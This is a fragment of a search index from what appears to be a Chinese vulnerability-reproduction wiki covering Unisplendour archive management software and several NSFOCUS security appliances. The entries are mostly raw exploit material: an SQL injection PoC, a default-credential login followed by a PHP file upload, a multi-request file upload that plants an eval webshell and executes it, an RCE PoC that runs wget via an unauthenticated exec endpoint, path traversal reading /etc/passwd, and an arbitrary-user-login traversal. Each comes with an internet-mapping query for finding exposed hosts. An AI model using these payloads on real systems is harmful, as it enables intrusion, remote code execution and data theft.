","date":"0001-01-01","objectID":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editpass.html-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-41638/:1:0","tags":null,"title":"","uri":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editpass.html-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-41638/"},{"categories":null,"content":"漏洞影响 紫光电子档案管理系统 ","date":"0001-01-01","objectID":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editpass.html-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-41638/:2:0","tags":null,"title":"","uri":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editpass.html-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-41638/"},{"categories":null,"content":"网络测绘 app=\"紫光档案管理系统\" ","date":"0001-01-01","objectID":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editpass.html-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-41638/:3:0","tags":null,"title":"","uri":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editpass.html-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-41638/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1))) ","date":"0001-01-01","objectID":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editpass.html-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-41638/:4:0","tags":null,"title":"","uri":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editpass.html-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-41638/"},{"categories":null,"content":"紫光档案管理系统 upload.html 后台文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 紫光软件系统有限公司（以下简称“紫光软件”）是中国领先的行业解决方案和IT服务提供商。 紫光电子档案管理系统后台存在文件上传漏洞。攻击者可利用漏洞获取数据库敏感信息。 ","date":"0001-01-01","objectID":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 紫光电子档案管理系统 ","date":"0001-01-01","objectID":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"紫光档案管理系统\" ","date":"0001-01-01","objectID":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 使用默认口令登录后台 admin/admin, 发送请求包 POST /System/Cms/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1 Host: Accept: application/json, text/javascript, */*; q=0.01 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Content-Length: 614 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygIRYWNxmDYiZBguT ------WebKitFormBoundarygIRYWNxmDYiZBguT Content-Disposition: form-data; name=\"userID\" admin ------WebKitFormBoundarygIRYWNxmDYiZBguT Content-Disposition: form-data; name=\"fondsid\" 1 ------WebKitFormBoundarygIRYWNxmDYiZBguT Content-Disposition: form-data; name=\"comid\" 1 ------WebKitFormBoundarygIRYWNxmDYiZBguT Content-Disposition: form-data; name=\"token\" 6b79a77180e9ec3a7ca351ebe54641a2 ------WebKitFormBoundarygIRYWNxmDYiZBguT Content-Disposition: form-data; name=\"files[]\"; filename=\"phpinfo.php\" Content-Type: text/php \u003c?php phpinfo();?\u003e ------WebKitFormBoundarygIRYWNxmDYiZBguT-- 回显路径即为上传成功的文件路径 ","date":"0001-01-01","objectID":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"绿盟 BAS日志数据安全性分析系统 accountmanage 未授权访问漏洞 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-bas%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F-accountmanage-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-bas%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F-accountmanage-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 绿盟 BAS日志数据安全性分析系统存在未授权访问漏洞，通过漏洞可以添加任意账户登录平台获取敏感信息 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-bas%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F-accountmanage-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-bas%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F-accountmanage-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 绿盟 BAS日志数据安全性分析系统 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-bas%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F-accountmanage-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-bas%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F-accountmanage-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"WebApi/encrypt/js-sha1/build/sha1.min.js\" ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-bas%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F-accountmanage-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-bas%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F-accountmanage-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 未授权页面 /accountmanage/index 添加用户并登录 使用账户登录后台 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-bas%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F-accountmanage-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-bas%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F-accountmanage-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"绿盟 NF下一代防火墙 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 绿盟 SSLVPN 存在任意文件上传漏洞，攻击者通过发送特殊的请求包可以获取服务器权限，进行远程命令执行 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 绿盟 SSLVPN ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"NSFOCUS-下一代防火墙\" ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 出现漏洞的端口为 8081 POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9 Host: --1d52ba2a11ad8a915eddab1a0e85acd9 Content-Disposition: form-data; name=\"file\"; filename=\"sess_82c13f359d0dd8f51c29d658a9c8ac71\" lang|s:52:\"../../../../../../../../../../../../../../../../tmp/\"; --1d52ba2a11ad8a915eddab1a0e85acd9-- POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef Host: --4803b59d015026999b45993b1245f0ef Content-Disposition: form-data; name=\"file\"; filename=\"compose.php\" \u003c?php eval($_POST['cmd']);?\u003e --4803b59d015026999b45993b1245f0ef-- POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef Host: --4803b59d015026999b45993b1245f0ef Content-Disposition: form-data; name=\"file\"; filename=\"compose.php\" \u003c?php eval($_POST['cmd']);?\u003e --4803b59d015026999b45993b1245f0ef-- POST /mail/include/header_main.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71 Host: cmd=phpinfo(); ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-nf%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"绿盟 SAS堡垒机 Exec 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 绿盟 SAS堡垒机 Exec 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 绿盟 SAS堡垒机 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"'/needUsbkey.php?username='\" ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 漏洞存在于文件 ExecController.php 文件中 \u003c?php require_once 'Nsc/Websvc/Response.php'; class ExecController extends Cavy_Controller_Action { var $models = 'no'; public function index() { $command = $this-\u003e_params['cmd']; $ret = 0; $output = array(); exec($command,$output,$ret); $result = new StdClass; if ($ret != 0) { $result-\u003ecode = Nsc_Websvc_Response::EXEC_ERROR; $result-\u003etext = \"exec error\"; } else { $result-\u003ecode = Nsc_Websvc_Response::SUCCESS; // $result-\u003etext = implode(\"\\n\",$output); $result-\u003etext = \"WEBSVC OK\"; } $this-\u003e_render(array('result'=\u003e$result),'/websvc/result'); } } ?\u003e 验证POC /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"绿盟 SAS堡垒机 GetFile 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-getfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-getfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-getfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-getfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 绿盟 SAS堡垒机 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-getfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-getfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"'/needUsbkey.php?username='\" ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-getfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-getfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 漏洞存在于文件 GetFileController.php 文件中 验证POC /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-getfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-getfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 绿盟 SAS堡垒机 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"'/needUsbkey.php?username='\" ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php\u0026method=login\u0026user_account=admin ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"绿盟 UTS综合威胁探针 信息泄露登陆绕过漏洞 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-uts%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-uts%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 绿盟 UTS综合威胁探针 某个接口未做授权导致未授权漏洞 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-uts%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-uts%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 绿盟 UTS综合威胁探针 ","date":"0001-01-01","objectID":"/%E7%BB%BF%E7%9B%9F-uts%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BB%BF%E7%9B%9F-uts%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"NSFOCUS-UTS综合威胁探针\" 